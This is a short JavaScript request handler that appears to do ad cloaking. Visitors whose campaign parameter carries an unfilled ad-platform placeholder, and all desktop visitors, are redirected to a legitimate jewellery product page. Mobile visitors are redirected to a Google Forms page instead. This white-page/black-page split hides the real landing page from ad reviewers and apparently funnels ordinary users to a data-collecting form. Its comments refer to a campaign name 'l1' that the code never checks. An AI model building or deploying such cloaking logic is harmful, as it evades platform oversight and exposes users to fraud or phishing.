export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://bymusti.com/collections/wedding-engagement/products/3-02ct-cushion-cvd-bezel-set-engagemnt-ring";
    const blackPageURL = "https://docs.google.com/forms/d/e/1FAIpQLSf0Z6V8M7Z_Y_LHmGR4Hdkv7pdO3Fog-cfYV0I5leOg5dWQyg/viewform?usp=dialog";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
